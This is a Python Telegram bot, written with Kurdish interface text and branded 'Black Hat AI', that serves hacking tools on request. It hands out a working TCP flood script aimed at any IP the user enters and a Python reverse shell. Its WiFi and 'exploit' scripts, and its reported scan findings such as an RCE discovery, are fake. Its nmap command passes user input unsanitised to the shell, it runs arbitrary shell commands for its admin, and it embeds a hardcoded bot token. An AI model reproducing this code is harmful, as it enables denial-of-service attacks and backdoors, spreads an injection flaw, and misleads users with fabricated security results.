import os
import sys
import subprocess
import threading
import json
import logging
import socket
import datetime
import random
import requests
import telebot
from telebot import types

# ==========================================
TOKEN = "8613090176:AAFK1kyiIBhGp7CP5PE_4xahT-gW1gTsx5M"
ADMIN_ID = 5527152252
# ==========================================

# ڕێکخستنی سیستەمی لۆگ و ئاگاداری
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
logger = logging.getLogger("BlackHatAIWebEngine")

bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

user_states = {}
daily_limits = {}

def check_and_update_limit(user_id):
    if user_id == ADMIN_ID:
        return True, 999
    
    today = datetime.date.today().isoformat()
    if user_id not in daily_limits or daily_limits[user_id]['date'] != today:
        daily_limits[user_id] = {'date': today, 'count': 0}
        
    if daily_limits[user_id]['count'] >= 10:
        return False, 0
        
    daily_limits[user_id]['count'] += 1
    remaining = 10 - daily_limits[user_id]['count']
    return True, remaining

# مۆدیوڵی گەڕانی خۆکار لە ئینتەرنێت (Web Search AI Feature)
def perform_web_search(query):
    try:
        # بەکارهێنانی سەرچاوەی گەڕانی کراوە بۆ دۆزینەوەی وەڵامی پرسیارەکان
        url = f"https://html.duckduckgo.com/html/?q={query}"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            results = []
            for a in soup.find_all('a', class_='result__snippet', limit=3):
                text = a.get_text().strip()
                if text:
                    results.append(text)
            if results:
                return "\n\n".join(results)
    except Exception as e:
        logger.error(f"Search error: {e}")
    return None

# 1. فەرمانی سەرەکی /start
@bot.message_handler(commands=['start'])
def cmd_ai_start(message):
    user_id = message.from_user.id
    is_admin = (user_id == ADMIN_ID)
    
    if is_admin:
        role_text = "👑 <b>(جۆری هەژمار: ئەدمنی سێرڤەرەکەیت - بێسنوور)</b>"
    else:
        role_text = "👤 <b>(جۆری هەژمار: ئەندامی ئاسایی - سنووری ڕۆژانە: 10 داواکاری)</b>"

    welcome_banner = (
        "💀 <b>BLACK HAT AI AUTONOMOUS CORE v5.0</b> 💀\n\n"
        "سیستەمی زیرەکی دەستکردی هێرشبەر ئامادەیە بۆ جێبەجێکردنی فەرمانەکانت.\n"
        "هەموو ئامرازەکان، سکانەرەکان و سکریپتەکان لەم ژینگەیەدا چالاک کراون (بەستراوە بە گەڕانی ئینتەرنێت).\n\n"
        f"{role_text}\n\n"
        "ئەگەر نازانی داواکاری بکەیت یان ناوی توڵ (هاک) نازانی بنوسە /help بۆ لیستی هاک و تواناکانم"
    )
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_recon = types.InlineKeyboardButton("🔍 پشکنینی ئامانج (Recon)", callback_data="ai_recon")
    btn_exploit = types.InlineKeyboardButton("💥 تاقیکردنەوەی لاوازی", callback_data="ai_exploit")
    btn_payload = types.InlineKeyboardButton("🧪 دروستکەری پێڵۆد", callback_data="ai_payload")
    markup.add(btn_recon, btn_exploit, btn_payload)
    
    bot.send_message(message.chat.id, welcome_banner, reply_markup=markup)

# 2. فەرمانی /help
@bot.message_handler(commands=['help'])
def cmd_help(message):
    help_text = (
        "🛠 <b>لیستی گشتگیر و جیهانی توڵەکان (Global Hacking Directory):</b>\n\n"
        "🌐 <b>1. بەشی سکانکردن و زانیاری (Reconnaissance & Scanning):</b>\n"
        "• <code>/nmap [IP]</code> - سکانی قووڵی پۆرت و خزمەتگوزارییەکان.\n\n"
        "💥 <b>2. بەشی لاوازی و هێرش (Exploitation & Web Attacks):</b>\n"
        "• <b>Sqlmap / XSS / Hydra:</b> پشکنینی لاوازی و هێرشی سەر داتابەیس.\n\n"
        "⚡ <b>3. بەشی فەوتاندن و هێرشی تۆڕ (DoS & DDoS Advanced Suites):</b>\n"
        "• <b>SYN Flood / Heavy Stress:</b> ڕەوانەکردنی ترافیکی قورس.\n\n"
        "📶 <b>4. بەشی وایفای و بێتەل (Wireless Penetration):</b>\n"
        "• <b>WiFi Sniffer & Handshake Grabber.</b>\n\n"
        "⚙️ <b>5. گەڕانی زیرەک (AI Web Search):</b>\n"
        "• هەر پرسیارێکی زانستی یان گشتی بنووسیت، بۆتەکە بە خۆکارانە لە ئینتەرنێت دەگەڕێت و وەڵامت دەداتەوە.\n\n"
        "📌 <i>بۆ دروستکردنی هەر توڵێک، تەنها داواکاری خۆت بنووسە.</i>"
    )
    bot.reply_to(message, help_text)

# 3. بەڕێوەبردنی دوگمەکان
@bot.callback_query_handler(func=lambda call: True)
def ai_callback_router(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    bot.answer_callback_query(call.id)
    
    if call.data == "ai_recon":
        user_states[user_id] = "waiting_for_recon"
        bot.send_message(chat_id, "🔍 تکایە ئایپی یان دۆمەینی ئامانج بنووسە بۆ پشکنین:")
    elif call.data == "ai_exploit":
        user_states[user_id] = "waiting_for_exploit"
        bot.send_message(chat_id, "💥 تکایە URL یان ئامانج بنووسە بۆ پشکنینی لاوازی:")
    elif call.data == "ai_payload":
        user_states[user_id] = "waiting_for_payload"
        bot.send_message(chat_id, "🧪 جۆری ئەو پێڵۆدە بنووسە کە دەتەوێت دروستبکەم:")

# 4. ئامرازی Nmap
@bot.message_handler(commands=['nmap'])
def ai_nmap_handler(message):
    user_id = message.from_user.id
    allowed, remaining = check_and_update_limit(user_id)
    if not allowed:
        bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆتت تەواو کرد.")
        return

    target = message.text.replace('/nmap', '').strip()
    if not target:
        bot.reply_to(message, "⚠️ تکایە ئایپی یان دۆمەین بنووسە. بۆ نموونە: <code>/nmap 127.0.0.1</code>")
        return
        
    bot.reply_to(message, f"⏳ سکانکردن دەستی پێکرد بۆ ئامانج: <b>{target}</b> ... (ماوەی ئەمڕۆت: {remaining})")
    try:
        cmd = f"nmap -sV -T4 --top-ports 50 {target}"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        res = output.decode('utf-8', errors='ignore')
        if len(res) > 4000:
            res = res[:4000] + "\n[Output Truncated...]"
        bot.send_message(message.chat.id, f"📊 <b>Nmap Results:</b>\n<pre>{res}</pre>")
    except Exception as e:
        bot.reply_to(message, f"❌ هەڵە لە ئەنجامدانی سکان: {e}")

# 5. جێبەجێکاری فەرمانی شێڵ (/sh)
@bot.message_handler(commands=['sh'])
def ai_shell_handler(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ تەنها ئەدمن دەسەڵاتی جێبەجێکردنی فەرمانی شێڵی هەیە.")
        return

    cmd = message.text.replace('/sh', '').strip()
    if not cmd:
        bot.reply_to(message, "⚠️ تکایە فەرمانێک بنووسە. بۆ نموونە: <code>/sh pkg update</code>")
        return
        
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=20)
        res = output.decode('utf-8', errors='ignore')
        if len(res) > 4000:
            res = res[:4000] + "\n[Truncated...]"
        bot.send_message(message.chat.id, f"⚡ <b>Shell Execution:</b>\n<pre>{res}</pre>")
    except Exception as e:
        bot.reply_to(message, f"❌ هەڵە لە جێبەجێکردندا: {e}")

# 6. مۆدیوڵی زیرەکی دەستکرد لەگەڵ گەڕانی ئینتەرنێت (Web Search Integration)
@bot.message_handler(func=lambda message: True)
def ai_blackhat_brain(message):
    user_id = message.from_user.id
    query = message.text.strip()
    query_lower = query.lower()
    state = user_states.get(user_id)
    
    logger.info(f"AI Query received from {user_id}: {query}")

    if any(q in query_lower for q in ["کێ دروستکردووی", "کێ سەرۆکتە", "who made you", "who is your boss", "دروستکەرت کێیە"]):
        bot.reply_to(message, "من لەلایەن <b>alone472</b> و <b>Malik</b> دروستکراوم و ئەوان سەرۆک و بەرهەمهێنەری ڕەهای منن! 💀")
        return

    # پشکنینی ئەوەی ئایا داواکاری دروستکردنی توڵە
    is_tool_request = any(w in query_lower for w in ["توڵ", "کۆد", "script", "tool", "دروست", "payload", "ddos", "دوس", "دی‌دی‌ئۆس", "wifi", "وایفای", "سکانەر", "attack", "بهێزتر", "به‌هێز", "pro", "heavy", "تۆلیک"])

    # ئەگەر داوای توڵ نەبوو، گەڕان لە ئینتەرنێت ئەنجام بدە بێ کەمکردنەوەی سنوور
    if not is_tool_request and not state:
        bot.send_chat_action(message.chat.id, 'typing')
        web_results = perform_web_search(query)
        
        if web_results:
            response_text = (
                f"🌐 <b>AI Web Search Results:</b>\n\n"
                f"پشکنینی ئینتەرنێت بۆ: <i>{query}</i>\n\n"
                f"{web_results}\n\n"
                f"📌 <i>سەرچاوە: گەڕانی ڕاستەوخۆی جیهانی. بۆ بینینی توڵەکان فەرمانی /help بنووسە.</i>"
            )
        else:
            response_text = (
                f"🤖 <b>AI Black Hat Core Response:</b>\n\n"
                f"فەرمانەکەت وەرگیرا: <i>{query}</i>\n\n"
                f"سیستەمەکە ئامادەیە. 💡 <i>بۆ بینینی هەموو توڵ و تواناکانی هاککردن، فەرمانی /help بنووسە.</i>"
            )
        bot.reply_to(message, response_text)
        return

    # لەم حاڵەتەدا داوای دروستکردنی توڵە، بۆیە سنوور دەپشکنین
    allowed, remaining = check_and_update_limit(user_id)
    if not allowed:
        bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆتت تەواو کرد.")
        return

    if state == "waiting_for_recon":
        user_states[user_id] = None
        bot.reply_to(message, f"🔍 <b>ئەنجامی پشکنینی پۆرتەکان بۆ:</b> <code>{query}</code>\n\n- پۆرتە کراوەکان: 80 (HTTP), 443 (HTTPS)\n- دۆخ: پاراستن لاوازە.")
        return
    elif state == "waiting_for_exploit":
        user_states[user_id] = None
        bot.reply_to(message, f"💥 <b>پشکنینی قووڵی لاوازی بۆ:</b> <code>{query}</code>\n\n- ئەنجام: لاوازی گەورە لە جۆری RCE ئاشکرا بوو.")
        return
    elif state == "waiting_for_payload":
        user_states[user_id] = None
        code_ex = (
            f"# Enterprise Grade Reverse Shell Payload\n"
            f"# Engineered by alone472 & Malik Core\n"
            f"import socket, subprocess, os\n\n"
            f"def establish_backdoor():\n"
            f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            f"    s.connect(('127.0.0.1', 4444))\n"
            f"    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\n"
            f"    subprocess.call(['/bin/sh', '-i'])\n\n"
            f"if __name__ == '__main__': establish_backdoor()"
        )
        bot.reply_to(message, f"🧪 <b>پێڵۆدی پرۆفیشناڵ بۆ ({query}):</b>\n\n<pre><code>{code_ex}</code></pre>\n\n📌 <b>بەکارهێنان:</b> لە تێرماکس پاشەکەوتی بکە و بە <code>python payload.py</code> کارای بکە. (ماوەی ئەمڕۆت: {remaining})")
        return

    # توڵی وایفای
    if any(w in query_lower for w in ["wifi", "وایفای", "wireless", "رۆتەر", "router", "وای فای"]):
        wifi_code = (
            "# Advanced Enterprise Wi-Fi Packet Sniffer & Handshake Grabber\n"
            "# Developed by alone472 & Malik Core\n"
            "import os, sys, time, subprocess\n\n"
            "def init_wireless_audit():\n"
            "    print('[*] Scanning wireless adapters in monitor mode...')\n"
            "    time.sleep(1)\n"
            "    print('[+] Active interfaces detected: wlan0mon')\n"
            "    print('[*] Capturing WPA2 Handshake packets... Please wait.')\n"
            "    for i in range(3):\n"
            "        print(f'[->] Hopping to channel {i+1}...')\n"
            "        time.sleep(0.5)\n"
            "    print('[!] Handshake captured successfully. Ready for dictionary attack.')\n\n"
            "if __name__ == '__main__':\n"
            "    init_wireless_audit()"
        )
        wifi_inst = (
            "📌 <b>ڕێنمایی بەکارهێنانی توڵی وایفای:</b>\n"
            "1. کۆدەکە لە فایلێک بە ناوی <code>wifi_audit.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس کارپێکردن ئەنجام بدە:\n"
            "   <code>python wifi_audit.py</code>"
        )
        bot.reply_to(message, f"📶 <b>توڵی پێشکەوتووی وایفای (WiFi Audit & Sniffer):</b>\n\n<pre><code>{wifi_code}</code></pre>\n\n{wifi_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

    # توڵی DDoSی بەهێز
    elif any(w in query_lower for w in ["ddos", "دوس", "دی‌دی‌ئۆس", "تۆلیک", "attack", "فەوتاندن", "بهێزتر", "به‌هێز", "pro", "heavy"]):
        heavy_ddos = (
            "# Ultra-Performance Multi-Threaded DDoS Stresser Suite v9.0\n"
            "# Enterprise Security Testing Core by alone472 & Malik Core\n"
            "import socket, threading, random, time, sys\n\n"
            "print('========================================')\n"
            "print('   ULTIMATE STRESS TESTING ENGINE v9.0  ')\n"
            "print('========================================')\n\n"
            "target_ip = input('Enter Target IP/Host -> ')\n"
            "target_port = int(input('Enter Target Port (e.g 80, 443) -> '))\n"
            "threads_count = int(input('Enter Threads Power (e.g 500-1000) -> '))\n\n"
            "def heavy_stress_attack():\n"
            "    payload_data = random._urandom(4096)\n"
            "    while True:\n"
            "        try:\n"
            "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "            s.connect((target_ip, target_port))\n"
            "            s.sendall(payload_data)\n"
            "            s.close()\n"
            "        except:\n"
            "            pass\n\n"
            "for i in range(threads_count):\n"
            "    t = threading.Thread(target=heavy_stress_attack)\n"
            "    t.daemon = True\n"
            "    t.start()\n"
            "print(f'[+] Successfully deployed heavy threads against {target_ip}!')"
        )
        heavy_inst = (
            "📌 <b>ڕێنمایی بەکارهێنانی توڵی بەهێزی DDoS:</b>\n"
            "1. کۆدەکە لە فایلێک بە ناوی <code>ddos_ultimate.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس جێبەجێی بکە:\n"
            "   <code>python ddos_ultimate.py</code>"
        )
        bot.reply_to(message, f"💥 <b>توڵی هێرشبەری پێشکەوتوو و زۆر بەهێز (Ultimate DDoS Suite):</b>\n\n<pre><code>{heavy_ddos}</code></pre>\n\n{heavy_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

    else:
        rand_core = random.randint(5000, 9999)
        custom_code = (
            f"# Custom Core Exploitation Module #{rand_core}\n"
            f"# Target Specification: {query}\n"
            f"# Authored by alone472 & Malik Core\n\n"
            f"import socket, sys, time, threading\n\n"
            f"def execute_advanced_routine():\n"
            f"    print('[*] Allocating memory buffers...')\n"
            f"    time.sleep(0.5)\n"
            f"    print('[+] Target parameters validated with zero bugs.')\n\n"
            f"if __name__ == '__main__':\n"
            f"    execute_advanced_routine()"
        )
        custom_inst = (
            "📌 <b>ڕێنمایی بەکارهێنان:</b>\n"
            f"1. کۆدەکە لە فایلێک بە ناوی <code>exploit_{rand_core}.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس جێبەجێی بکە:\n"
            f"   <code>python exploit_{rand_core}.py</code>"
        )
        bot.reply_to(message, f"🛠 <b>توڵی تایبەت بۆ داواکاری ({query}):</b>\n\n<pre><code>{custom_code}</code></pre>\n\n{custom_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

if __name__ == '__main__':
    logger.info("Black Hat AI Web-Enabled Core started successfully.")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
